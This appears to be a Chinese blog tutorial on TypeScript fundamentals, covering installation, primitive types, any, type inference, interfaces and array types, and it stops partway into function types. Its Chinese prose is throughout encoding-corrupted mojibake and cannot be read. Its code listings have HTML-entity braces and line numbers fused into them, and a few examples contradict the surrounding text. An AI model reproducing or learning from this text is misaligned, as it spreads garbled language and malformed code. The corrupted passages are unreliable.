å³ä½¿ä¸æ˜¾å¼çš„å®šä¹‰ç±»åž‹ï¼Œä¹Ÿèƒ½å¤Ÿè‡ªåŠ¨åšå‡ºç±»åž‹æŽ¨è®º å¯ä»¥å®šä¹‰ä»Žç®€å•åˆ°å¤æ‚çš„å‡ ä¹Žä¸€åˆ‡ç±»åž‹ å³ä½¿ TypeScript ç¼–è¯‘æŠ¥é”™ï¼Œä¹Ÿå¯ä»¥ç”Ÿæˆ JavaScript æ–‡ä»¶ å…¼å®¹ç¬¬ä¸‰æ–¹åº“ï¼Œå³ä½¿ç¬¬ä¸‰æ–¹åº“ä¸æ˜¯ç”¨ TypeScript å†™çš„ï¼Œä¹Ÿå¯ä»¥ç¼–å†™å•ç‹¬çš„ç±»åž‹æ–‡ä»¶ä¾› TypeScript è¯»å– TypeScript æ‹¥æœ‰æ´»è·ƒçš„ç¤¾åŒº å¤§éƒ¨åˆ†ç¬¬ä¸‰æ–¹åº“éƒ½æœ‰æä¾›ç»™ TypeScript çš„ç±»åž‹å®šä¹‰æ–‡ä»¶ Google å¼€å‘çš„ Angular2 å°±æ˜¯ä½¿ç”¨ TypeScript ç¼–å†™çš„ TypeScript æ‹¥æŠ±äº† ES6 è§„èŒƒï¼Œä¹Ÿæ”¯æŒéƒ¨åˆ† ESNext è‰æ¡ˆçš„è§„èŒƒ TypeScript çš„ç¼ºç‚¹ä»»ä½•äº‹ç‰©éƒ½æ˜¯æœ‰ä¸¤é¢æ€§çš„ï¼Œä½œè€…è®¤ä¸º TypeScript çš„å¼Šç«¯åœ¨äºŽï¼š æœ‰ä¸€å®šçš„å­¦ä¹ æˆæœ¬ï¼Œéœ€è¦ç†è§£æŽ¥å£ï¼ˆInterfacesï¼‰ã€æ³›åž‹ï¼ˆGenericsï¼‰ã€ç±»ï¼ˆClassesï¼‰ã€æžšä¸¾ç±»åž‹ï¼ˆEnumsï¼‰ç­‰å‰ç«¯å·¥ç¨‹å¸ˆå¯èƒ½ä¸æ˜¯å¾ˆç†Ÿæ‚‰çš„æ¦‚å¿µ çŸ­æœŸå¯èƒ½ä¼šå¢žåŠ ä¸€äº›å¼€å‘æˆæœ¬ï¼Œæ¯•ç«Ÿè¦å¤šå†™ä¸€äº›ç±»åž‹çš„å®šä¹‰ï¼Œä¸è¿‡å¯¹äºŽä¸€ä¸ªéœ€è¦é•¿æœŸç»´æŠ¤çš„é¡¹ç›®ï¼ŒTypeScript èƒ½å¤Ÿå‡å°‘å…¶ç»´æŠ¤æˆæœ¬ é›†æˆåˆ°æž„å»ºæµç¨‹éœ€è¦ä¸€äº›å·¥ä½œé‡ å¯èƒ½å’Œä¸€äº›åº“ç»“åˆçš„ä¸æ˜¯å¾ˆå®Œç¾Ž å®‰è£… TypeScriptTypeScript çš„å‘½ä»¤è¡Œå·¥å…·å®‰è£…æ–¹æ³•å¦‚ä¸‹ï¼š 1npm install -g typescript ä»¥ä¸Šå‘½ä»¤ä¼šåœ¨å…¨å±€çŽ¯å¢ƒä¸‹å®‰è£… tsc å‘½ä»¤ï¼Œå®‰è£…å®Œæˆä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æ‰§è¡Œ tsc å‘½ä»¤äº†ã€‚ ç¼–è¯‘ä¸€ä¸ª TypeScript æ–‡ä»¶å¾ˆç®€å•ï¼š 1tsc hello.ts æˆ‘ä»¬çº¦å®šä½¿ç”¨ TypeScript ç¼–å†™çš„æ–‡ä»¶ä»¥ .ts ä¸ºåŽç¼€ï¼Œç”¨ TypeScript ç¼–å†™ React æ—¶ï¼Œä»¥ .tsx ä¸ºåŽç¼€ã€‚ Hello TypeScriptç®€å•ä¾‹å­ 123456function sayHello(person:string)&#123; return 'Hello,' + person;&#125;let user = 'Tom';console.log(sayHello(user)); ç„¶åŽæ‰§è¡Œ 1tsc hello.ts ä¼šç¼–è¯‘æˆä¸€ä¸ªå¥½çš„æ–‡ä»¶ï¼Œhello.js 12345function sayHello(person) &#123; return 'Hello,' + person;&#125;var user = 'Tom';console.log(sayHello(user)); TypeScript ä¸­ï¼Œä½¿ç”¨ :æŒ‡å®šå˜é‡ç±»åž‹ï¼Œ :çš„å‰åŽæœ‰æ²¡æœ‰ç©ºæ ¼éƒ½å¯ä»¥ ä¸Šè¿°ä¾‹å­ä¸­ï¼Œç”¨ :æŒ‡å®š person å‚æ•°ç±»åž‹ä¸º stringã€‚TypeScriptåªä¼šè¿›è¡Œé™æ€æ£€æŸ¥ï¼Œå¦‚æžœæœ‰é”™è¯¯ï¼Œç¼–è¯‘çš„æ—¶å€™å°±ä¼šæŠ¥é”™ã€‚ ç¼–è¯‘ä¸‹é¢çš„å†…å®¹ 123456function sayHello(person:string)&#123; return 'Hello,' + person;&#125;let user = [0, 1, 2];console.log(sayHello(user)); ç¼–è¾‘å™¨ä¼šæŠ¥é”™ ä½†jsæ–‡ä»¶è¿˜æ˜¯ç¼–è¯‘å‡ºæ¥äº† 12345function sayHello(person) &#123; return 'Hello,' + person;&#125;var user = [0, 1, 2];console.log(sayHello(user)); TypeScript ç¼–è¯‘çš„æ—¶å€™å³ä½¿æŠ¥é”™äº†ï¼Œè¿˜æ˜¯ä¼šç”Ÿæˆç¼–è¯‘ç»“æžœï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨è¿™ä¸ªç¼–è¯‘ä¹‹åŽçš„æ–‡ä»¶ã€‚ å¦‚æžœè¦åœ¨æŠ¥é”™çš„æ—¶å€™ç»ˆæ­¢ js æ–‡ä»¶çš„ç”Ÿæˆï¼Œå¯ä»¥åœ¨ tsconfig.json ä¸­é…ç½® noEmitOnError å³å¯ã€‚å…³äºŽ tsconfig.jsonï¼Œè¯·å‚é˜…å®˜æ–¹æ‰‹å†Œï¼ˆä¸­æ–‡ç‰ˆï¼‰ã€‚ åŸºç¡€æœ¬éƒ¨åˆ†ä»‹ç»äº† TypeScript ä¸­çš„å¸¸ç”¨ç±»åž‹å’Œä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œæ—¨åœ¨è®©å¤§å®¶å¯¹ TypeScript æœ‰ä¸ªåˆæ­¥çš„ç†è§£ã€‚å…·ä½“å†…å®¹åŒ…æ‹¬ï¼š åŽŸå§‹æ•°æ®ç±»åž‹ ä»»æ„å€¼ ç±»åž‹æŽ¨è®º è”åˆç±»åž‹ å¯¹è±¡çš„ç±»åž‹â€”â€”æŽ¥å£ æ•°ç»„çš„ç±»åž‹ å‡½æ•°çš„ç±»åž‹ ç±»åž‹æ–­è¨€ å£°æ˜Žæ–‡ä»¶ å†…ç½®å¯¹è±¡ åŽŸå§‹æ•°æ®ç±»åž‹JavaScript çš„ç±»åž‹åˆ†ä¸ºä¸¤ç§ï¼šåŽŸå§‹æ•°æ®ç±»åž‹ï¼ˆPrimitive data typesï¼‰å’Œå¯¹è±¡ç±»åž‹ï¼ˆObject typesï¼‰ã€‚ åŽŸå§‹æ•°æ®ç±»åž‹åŒ…æ‹¬ï¼šå¸ƒå°”å€¼ã€æ•°å€¼ã€å­—ç¬¦ä¸²ã€nullã€undefinedä»¥åŠ ES6 ä¸­çš„æ–°ç±»åž‹ Symbolã€‚ å¸ƒå°”å€¼å¸ƒå°”å€¼æ˜¯æœ€åŸºç¡€çš„ç±»åž‹ï¼Œåœ¨TypeScript ä¸­ï¼Œä½¿ç”¨ booleanå®šä¹‰å¸ƒå°”å€¼ç±»åž‹ 12let isDone:boolean = false;// var isDone = false; æ³¨æ„ï¼Œä½¿ç”¨æž„é€ å‡½æ•° Booleanåˆ›é€ çš„å¯¹è±¡ä¸æ˜¯å¸ƒå°”å€¼ 12let createdByNewBoolean:boolean = new Boolean(1);// error TS2322: Type 'Boolean' is not assignable to type 'boolean'.'boolean' is a primitive, but 'Boolean' is a wrapper object. Prefer using 'boolean' when possible. äº‹å®žä¸Š new Boolean()è¿”å›žçš„æ˜¯ä¸€ä¸ª Booleanå¯¹è±¡ï¼š 1let createdByNewBoolean:Boolean = new Boolean(1); ç›´æŽ¥è°ƒç”¨ Booleanï¼Œä¹Ÿå¯ä»¥è¿”å›žä¸€ä¸ª booleanç±»åž‹ï¼š 1let createByBoolean:boolean = Boolean(1); åœ¨ TypeScriptä¸­ï¼Œbooleanæ˜¯ JavaScript ä¸­çš„åŸºæœ¬ç±»åž‹ï¼Œè€Œ Booleanæ˜¯ JavaScript ä¸­çš„æž„é€ å‡½æ•°ã€‚å…¶ä»–åŸºæœ¬ç±»åž‹ï¼ˆé™¤äº†nullå’Œundefinedï¼‰ä¸€æ ·ã€‚ æ•°å€¼ä½¿ç”¨ numberå®šä¹‰æ•°å€¼ç±»åž‹ï¼š 12345678let decLiteral: number = 6;let hexLiteral: number = 0xf00d;// ES6 ä¸­çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ³•let binaryLiteral: number = 0b1010;// ES6 çš„å…«è¿›åˆ¶è¡¨ç¤ºæ³•let octalLiteral: number = 0o733;let notANumber: number = NaN;let infinityNumber: number = Infinity; ç¼–è¯‘ç»“æžœï¼š 12345678var decLiteral = 6;var hexLiteral = 0xf00d;// ES6 ä¸­çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ³•var binaryLiteral = 10;// ES6 çš„å…«è¿›åˆ¶è¡¨ç¤ºæ³•var octalLiteral = 475;var notANumber = NaN;var infinityNumber = Infinity; å…¶ä¸­ 0b1010 å’Œ 0o744 æ˜¯ ES6 ä¸­çš„äºŒè¿›åˆ¶å’Œå…«è¿›åˆ¶è¡¨ç¤ºæ³•ï¼Œå®ƒä»¬ä¼šè¢«ç¼–è¯‘ä¸ºåè¿›åˆ¶æ•°å­—ã€‚ å­—ç¬¦ä¸²ä½¿ç”¨ stringå®šä¹‰å­—ç¬¦ä¸²ç±»åž‹ 12345let myName: string = 'Tom';let myAge: number = 25;// æ¨¡å—å­—ç¬¦ä¸²let sentence: string = `Hello,my name is $&#123;myName&#125;,I'll be $&#123;myAge + 1&#125; years old next month.` ç¼–è¾‘ç»“æžœ 1234var myName = 'Tom';var myAge = 25;// æ¨¡å—å­—ç¬¦ä¸²var sentence = "Hello,my name is " + myName + ",\nI'll be " + (myAge + 1) + " years old next month."; ES6 ä¸­çš„æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œ${expr} ç”¨æ¥åœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­åµŒå…¥è¡¨è¾¾å¼ã€‚ ç©ºå€¼JavaScript æ²¡æœ‰ç©ºå€¼ï¼ˆVoidï¼‰çš„æ¦‚å¿µï¼Œåœ¨ TypeScript ä¸­ï¼Œå¯ä»¥ç”¨ voidè¡¨ç¤ºæ²¡æœ‰ä»»ä½•çš„è¿”å›žå€¼çš„å‡½æ•°ï¼š 123function alertName() :void&#123; alert('HAHAHAHA');&#125; å£°æ˜Žä¸€ä¸ª voidç±»åž‹çš„å˜é‡æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå› ä¸ºä½ åªèƒ½å°†å®ƒèµ‹å€¼ä¸º undefinedæˆ–è€…æ˜¯ null 1let unusable: void = undefined; Null å’Œ Undefinedåœ¨ TypeScript ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ null å’Œ undefinedæ¥å®šä¹‰ä¸¤ä¸ªåŽŸå§‹æ•°æ®ç±»åž‹: 12let u: undefined = undefined;let n: null = null; ä¸Ž void çš„åŒºåˆ«æ˜¯ï¼Œundefined å’Œ null æ˜¯æ‰€æœ‰ç±»åž‹çš„å­ç±»åž‹ã€‚ä¹Ÿå°±æ˜¯è¯´ undefined ç±»åž‹çš„å˜é‡ï¼Œå¯ä»¥èµ‹å€¼ç»™ number ç±»åž‹çš„å˜é‡ï¼š 123456789// éƒ½ä¸ä¼šæŠ¥é”™let u: undefined = null;let n: null = undefined;let num1: number = undefined;let num2: number = null;let num3:undefined;let num4:null; è€Œ void ç±»åž‹çš„å˜é‡ä¸èƒ½èµ‹å€¼ç»™ number ç±»åž‹çš„å˜é‡ï¼š 123let u: void;let num: number = u;// TS2322: Type 'void' is not assignable to type 'number'. ä»»æ„å€¼ä»»æ„å€¼ï¼ˆAnyï¼‰ç”¨æ¥è¡¨ç¤ºå…è®¸èµ‹å€¼ä¸ºä»»æ„ç±»åž‹ ä»€ä¹ˆæ˜¯ä»»æ„å€¼ç±»åž‹å¦‚æžœæ˜¯ä¸€ä¸ªæ™®é€šç±»åž‹ï¼Œåœ¨èµ‹å€¼è¿‡ç¨‹ä¸­æ”¹å˜ç±»åž‹æ˜¯ä¸ç»™å…è®¸çš„ï¼š 123let myFavoriteNumber: string = 'seven';myFavoriteNumber = 7;// error TS2322: Type '7' is not assignable to type 'string'. ä½†å¦‚æžœæ˜¯ anyç±»åž‹ï¼Œåˆ™è¿è¡Œè¢«èµ‹å€¼ä¸ºä»»æ„ç±»åž‹ 12let myFavoriteNumber: any = 'seven';myFavoriteNumber = 7; ä»»æ„å€¼çš„å±žæ€§å’Œæ–¹æ³•åœ¨ä»»æ„å€¼ä¸Šè®¿é—®ä»»ä½•å±žæ€§éƒ½æ˜¯è¢«è¿è¡Œçš„ï¼š 123let anyThing: any = 'hello';console.log(anyThing.myName);console.log(anyThing.myName.firstName); ä¹Ÿè¿è¡Œè°ƒç”¨ä»»ä½•æ–¹æ³• 1234let anyThing: any = 'Tom';anyThing.setName('Jerry');anyThing.setName.sayHello('Jerry');anyThing.setName.setFirstName('Jerry'); å¯ä»¥è®¤ä¸ºï¼Œå£°æ˜Žä¸€ä¸ªå˜é‡ä¸ºä»»æ„å€¼ä¹‹åŽï¼Œå¯¹å®ƒçš„ä»»ä½•æ“ä½œï¼Œè¿”å›žçš„å†…å®¹çš„ç±»åž‹éƒ½æ˜¯ä»»æ„å€¼ã€‚ æœªå£°æ˜Žç±»åž‹çš„å˜é‡å˜é‡å¦‚æžœåœ¨å£°æ˜Žçš„æ—¶å€™ï¼ŒæœªæŒ‡å®šå…¶ç±»åž‹ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è¯†åˆ«ä¸ºä»»æ„å€¼ç±»åž‹ï¼š 12345let something;something = 'seven';something = 7;something.setName('Tom'); ç­‰ä»·äºŽ 12345let something: any;something = 'seven';something = 7;something.setName('Tom'); ç±»åž‹æŽ¨è®ºå¦‚æžœæ²¡æœ‰æ˜Žç¡®çš„æŒ‡å®šç±»åž‹ï¼Œé‚£ä¹ˆ TypeScript ä¼šä¾ç…§ç±»åž‹æŽ¨è®ºï¼ˆType Inferenceï¼‰çš„è§„åˆ™æŽ¨æ–­å‡ºæ¥ä¸€ä¸ªç±»åž‹ ä»€ä¹ˆæ˜¯ç±»åž‹æŽ¨è®ºä¸€ä¸‹ä»£ç æ²¡æœ‰æŒ‡å®šç±»åž‹ï¼Œä½†æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šæŠ¥é”™ 123let number = 'seven';number = 7;// Type '7' is not assignable to type 'string'. äº‹å®žä¸Šï¼Œå®ƒç­‰ä»·äºŽï¼š 123let number: string = 'seven';number = 7;// Type '7' is not assignable to type 'string'. TypeScript ä¼šåœ¨æ²¡æœ‰æ˜Žç¡®çš„æŒ‡å®šç±»åž‹çš„æ—¶å€™æŽ¨æµ‹å‡ºä¸€ä¸ªç±»åž‹ï¼Œè¿™å°±æ˜¯ç±»åž‹æŽ¨è®ºã€‚ å¦‚æžœå®šä¹‰çš„æ—¶å€™æ²¡æœ‰èµ‹å€¼ï¼Œä¸ç®¡ä¹‹åŽæœ‰æ²¡æœ‰èµ‹å€¼ï¼Œéƒ½ä¼šè¢«æŽ¨æ–­æˆ any ç±»åž‹è€Œå®Œå…¨ä¸è¢«ç±»åž‹æ£€æŸ¥ï¼š 123let number;number = 'seven'number = 7; å¯¹è±¡çš„ç±»åž‹â€”â€”æŽ¥å£åœ¨TypeScriptä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨æŽ¥å£ï¼ˆinterfacesï¼‰æ¥å®šä¹‰å¯¹è±¡çš„ç±»åž‹ ä»€ä¹ˆæ˜¯æŽ¥å£åœ¨é¢å‘å¯¹è±¡è¯­è¨€ä¸­ï¼ŒæŽ¥å£ï¼ˆInterfacesï¼‰æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µï¼Œå®ƒæ˜¯å¯¹è¡Œä¸ºçš„æŠ½è±¡ï¼Œè€Œå…·ä½“å¦‚ä½•è¡ŒåŠ¨éœ€è¦ç”±ç±»ï¼ˆclassesï¼‰åŽ»å®žçŽ°ï¼ˆimplementsï¼‰ TypeScript ä¸­çš„æŽ¥å£æ˜¯ä¸€ä¸ªçµæ´»çš„æ¦‚å¿µï¼Œé™¤äº†å¯ç”¨äºŽå¯¹ç±»çš„ä¸€éƒ¨åˆ†è¡Œä¸ºè¿›è¡ŒæŠ½è±¡ä»¥å¤–ï¼Œä¹Ÿå¸¸ç”¨äºŽå¯¹ã€Œå¯¹è±¡çš„å½¢çŠ¶ï¼ˆShapeï¼‰ã€è¿›è¡Œæè¿°ã€‚ ç®€å•çš„ä¾‹å­ 123456789interface Person&#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125; ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªæŽ¥å£ Personï¼ŒæŽ¥ç€å®šä¹‰äº†ä¸€ä¸ªå˜é‡ tom,å®ƒçš„ç±»åž‹æ˜¯ Personã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±çº¦æŸäº† tomçš„å½¢çŠ¶å¿…é¡»å’Œ Personä¸€æ ·äº†ã€‚ æŽ¥å£ä¸€èˆ¬é¦–å­—æ¯å¤§å†™ã€‚æœ‰çš„ç¼–ç¨‹è¯­è¨€ä¸­ä¼šå»ºè®®æŽ¥å£çš„åç§°åŠ ä¸Š I å‰ç¼€ã€‚ å®šä¹‰çš„å˜é‡æ¯”æŽ¥å£å°‘äº†ä¸€äº›å±žæ€§æ˜¯ä¸å…è®¸çš„ï¼š 12345678910interface Person&#123; name: string; age: number;&#125;let tom: Person&#123; name: 'Tom'&#125;// error TS2322: Type '&#123; name: string; &#125;' is not assignable to type 'Person'.// Property 'age' is missing in type '&#123; name: string; &#125;'. å¤šäº†ä¸€äº›å±žæ€§æ˜¯ä¸å…è®¸çš„ï¼š 123456789101112interface Person&#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male',&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'. // Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. å¯è§ï¼Œèµ‹å€¼çš„æ—¶å€™ï¼Œå˜é‡çš„å½¢çŠ¶å¿…é¡»å’ŒæŽ¥å£çš„å½¢çŠ¶ä¿æŒä¸€è‡´ å¯é€‰å±žæ€§æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸è¦å®Œå…¨åŒ¹é…ä¸€ä¸ªå½¢çŠ¶ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨å¯é€‰å±žæ€§ï¼š 12345678interface Person&#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom'&#125; 123456789interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125;; å¯é€‰å±žæ€§çš„å«ä¹‰æ˜¯è¯¥å±žæ€§å¯ä»¥ä¸å­˜åœ¨ã€‚ è¿™æ—¶ä»ç„¶ä¸å…è®¸æ·»åŠ æœªå®šä¹‰çš„å±žæ€§ï¼š 123456789101112interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. ä»»æ„å±žæ€§æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›ä¸€ä¸ªæŽ¥å£å…è®¸æœ‰ä»»æ„çš„å±žæ€§ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„æ–¹å¼ï¼š 12345678910interface Person &#123; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125; ä½¿ç”¨ [propName: string]å®šä¹‰äº†ä»»æ„å±žæ€§å– string ç±»åž‹çš„å€¼ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦å®šä¹‰äº†ä»»æ„å±žæ€§ï¼Œé‚£ä¹ˆç¡®å®šå±žæ€§å’Œå¯é€‰å±žæ€§éƒ½å¿…é¡»æ˜¯å®ƒçš„å­å±žæ€§ 1234567891011121314interface Person &#123; name: string; age?: number; [propName: string]: string;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male',&#125;// error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Property 'age' is incompatible with index signature.// Type 'number' is not assignable to type 'string'. ä¸Šä¾‹ä¸­ï¼Œä»»æ„å±žæ€§çš„å€¼å…è®¸æ˜¯ stringï¼Œä½†æ˜¯å¯é€‰å±žæ€§ age çš„å€¼å´æ˜¯ numberï¼Œnumber ä¸æ˜¯ string çš„å­å±žæ€§ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚ å¦å¤–ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶ { name: &#39;Tom&#39;, age: 25, gender: &#39;male&#39; } çš„ç±»åž‹è¢«æŽ¨æ–­æˆäº† { [x: string]: string | number; name: string; age: number; gender: string; }ï¼Œè¿™æ˜¯è”åˆç±»åž‹å’ŒæŽ¥å£çš„ç»“åˆã€‚ åªè¯»å±žæ€§æœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¯¹è±¡ä¸­çš„ä¸€äº›å­—æ®µåªèƒ½åœ¨åˆ›å»ºçš„æ—¶å€™è¢«èµ‹å€¼ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ readonlyå®šä¹‰åªè¯»å±žæ€§ 123456789101112131415interface Person &#123; readonly id : number; name: string; age?: number; [propName: string] :any;&#125;let tom: Person = &#123; id: 89757, name: 'Tom', gender: 'male'&#125;tom.id = 7893;// error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. ä¸Šä¾‹ä¸­ï¼Œä½¿ç”¨ readonlyå®šä¹‰çš„å±žæ€§ idåˆå§‹åŒ–åŽï¼Œåˆè¢«èµ‹å€¼äº†ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚ æ³¨æ„ï¼Œåªè¯»çš„çº¦æŸå­˜åœ¨äºŽç¬¬ä¸€æ¬¡ç»™å¯¹è±¡èµ‹å€¼çš„æ—¶å€™ï¼Œè€Œä¸æ˜¯ç¬¬ä¸€æ¬¡ç»™åªè¯»å±žæ€§èµ‹å€¼çš„æ—¶å€™ 12345678910111213141516interface Person &#123; readonly id: number; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125;;tom.id = 89757;// error TS2322: Type '&#123; name: string; gender: string; &#125;' is not assignable to type 'Person'.// Property 'id' is missing in type '&#123; name: string; gender: string; &#125;'.// error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. ä¸Šä¾‹ä¸­ï¼ŒæŠ¥é”™ä¿¡æ¯æœ‰ä¸¤å¤„ï¼Œç¬¬ä¸€å¤„æ˜¯åœ¨å¯¹ tom è¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œæ²¡æœ‰ç»™ id èµ‹å€¼ã€‚ ç¬¬äºŒå¤„æ˜¯åœ¨ç»™ tom.id èµ‹å€¼çš„æ—¶å€™ï¼Œç”±äºŽå®ƒæ˜¯åªè¯»å±žæ€§ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚ æ•°æ®çš„ç±»åž‹åœ¨ TypeScript ä¸­ï¼Œæ•°ç»„ç±»åž‹æœ‰å¤šç§å®šä¹‰æ–¹å¼ï¼Œæ¯”è¾ƒçµæ´»ã€‚ [ç±»åž‹+æ–¹æ‹¬å·]è¡¨ç¤ºæ³•æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ [ç±»åž‹+æ–¹æ‹¬å·]æ¥è¡¨ç¤ºæ•°ç»„ï¼š 1let fibonacci: number[] = [1,2,3,4,5]; æ•°ç»„çš„é¡¹ä¸­ä¸å…è®¸å‡ºçŽ°å…¶ä»–çš„ç±»åž‹ 12let fibonacci: number[] = [1,2,'3',4,5];// error TS2322: Type 'string' is not assignable to type 'number'. ä¸Šä¾‹ä¸­ï¼Œ[1, &#39;1&#39;, 2, 3, 5] çš„ç±»åž‹è¢«æŽ¨æ–­ä¸º (number | string)[]ï¼Œè¿™æ˜¯è”åˆç±»åž‹å’Œæ•°ç»„çš„ç»“åˆã€‚ æ•°ç»„çš„ä¸€äº›æ–¹æ³•çš„å‚æ•°ä¹Ÿä¼šæ ¹æ®æ•°ç»„åœ¨å®šä¹‰æ—¶çº¦å®šçš„ç±»åž‹è¿›è¡Œé™åˆ¶ï¼š 123let fibonacci: number[] = [1,2,3,4,5];fibonacci.push('8');//error TS2345: Argument of type '"8"' is not assignable to parameter of type 'number'. ä¸Šä¾‹ä¸­ï¼Œpush æ–¹æ³•åªå…è®¸ä¼ å…¥ number ç±»åž‹çš„å‚æ•°ï¼Œä½†æ˜¯å´ä¼ äº†ä¸€ä¸ª string ç±»åž‹çš„å‚æ•°ï¼Œæ‰€ä»¥æŠ¥é”™äº†ã€‚ æ•°ç»„æ³›åž‹ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°ç»„æ³›åž‹ï¼ˆArray Genericï¼‰Array&lt;elemType&gt;æ¥è¡¨ç¤ºæ•°ç»„ï¼š 1let fibonacci: Array&lt;number&gt; = [1,1,2,3,5]; ç”¨æŽ¥å£è¡¨ç¤ºæ•°ç»„æŽ¥å£ä¹Ÿå¯ä»¥ç”¨æ¥æè¿°æ•°ç»„ï¼š 1234interface NumberArray &#123; [index: number]: number;&#125;let fibonacci: NumberArray = [1,2,3,4,5]; NumberArray è¡¨ç¤ºï¼šåªè¦ index çš„ç±»åž‹æ˜¯ numberï¼Œé‚£ä¹ˆå€¼çš„ç±»åž‹å¿…é¡»æ˜¯ numberã€‚ any åœ¨æ•°ç»„ä¸­çš„åº”ç”¨ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„åšæ³•æ˜¯ï¼Œ ç”¨ anyè¡¨ç¤ºæ•°ç»„ä¸­å…è®¸å‡ºçŽ°ä»»æ„ç±»åž‹ï¼š 1let list: any[] = ['lbh',32,&#123;website:'http://laibh.top'&#125;] ç±»æ•°ç»„ç±»æ•°ç»„ï¼ˆArray-like Objectï¼‰ä¸æ˜¯æ•°ç»„ç±»åž‹ï¼Œæ¯”å¦‚ arguments: 12345function sum()&#123; let args: number[] = arguments;&#125;// error TS2322: Type 'IArguments' is not assignable to type 'number[]'.// Property 'pop' is missing in type 'IArguments'. äº‹å®žä¸Šå¸¸è§çš„ç±»æ•°ç»„éƒ½æœ‰è‡ªå·±çš„æŽ¥å£å®šä¹‰ï¼Œå¦‚ IArguments, NodeList, HTMLCollection ç­‰ï¼š 123function sum()&#123; let args: IArguments = arguments;&#125; å‡½æ•°çš„ç±»åž‹å‡½æ•°å£°æ˜Žåœ¨ JavaScript ä¸­ï¼Œæœ‰ä¸¤ç§å¸¸è§çš„å®šä¹‰å‡½æ•°çš„æ–¹å¼â€”â€”å‡½æ•°å£°æ˜Žï¼ˆFunction Declarationï¼‰å’Œå‡½æ•°è¡¨ç¤ºå¼ï¼ˆFunction Expressionï¼‰ 123456789// å‡½æ•°å£°æ˜Žï¼ˆFunction Declarationï¼‰function sum(x, y)&#123; return x + y;&#125;// å‡½æ•°è¡¨è¾¾å¼ï¼ˆFunction Expressionï¼‰let mySum = function(x, y)&#123; return x + y;&#125; ä¸€ä¸ªå‡½æ•°æœ‰è¾“å…¥å’Œè¾“å‡ºï¼Œè¦åœ¨ TypeScript ä¸­å¯¹å…¶è¿›è¡Œçº¦æŸï¼Œéœ€è¦æŠŠè¾“å…¥å’Œè¾“å…¥éƒ½è€ƒè™‘åˆ°ï¼Œå…¶ä¸­å‡½æ•°å£°æ˜Žçš„ç±»åž‹å®šä¹‰è¾ƒç®€å•ï¼š 123function sum(x:number, y:number) :number &#123; return x + y;&#125; æ³¨æ„ï¼Œè¾“å…¥å¤šä½™çš„ï¼ˆæˆ–è€…å°‘äºŽè¦æ±‚çš„ï¼‰å‚æ•°ï¼Œæ˜¯ä¸è¢«å…è®¸çš„ï¼š 123456function sum(x:number, y:number) :number &#123; return x + y;&#125;sum(1,2,3);// error TS2554: Expected 2 arguments, but got 3. 123456function sum(x:number, y:number) :number &#123; return x + y;&#125;sum(1);// error TS2554: Expected 2 arguments, but got 1. å‡½æ•°è¡¨è¾¾å¼å†™ä¸€ä¸ªå¯¹å‡½æ•°è¡¨è¾¾å¼ï¼ˆFunction Expressionï¼‰çš„å®šä¹‰ï¼š 123let mySum = function(x: number, y: number) : number&#123; return x + y;&#125; è¿™æ˜¯å¯ä»¥é€šè¿‡ç¼–è¯‘çš„ï¼Œä¸è¿‡äº‹å®žä¸Šï¼Œä¸Šé¢çš„ä»£ç åªå¯¹ç­‰å·å³ä¾§çš„åŒ¿åå‡½æ•°è¿›è¡Œäº†ç±»åž‹å®šä¹‰ï¼Œè€Œç­‰å·å·¦è¾¹çš„ 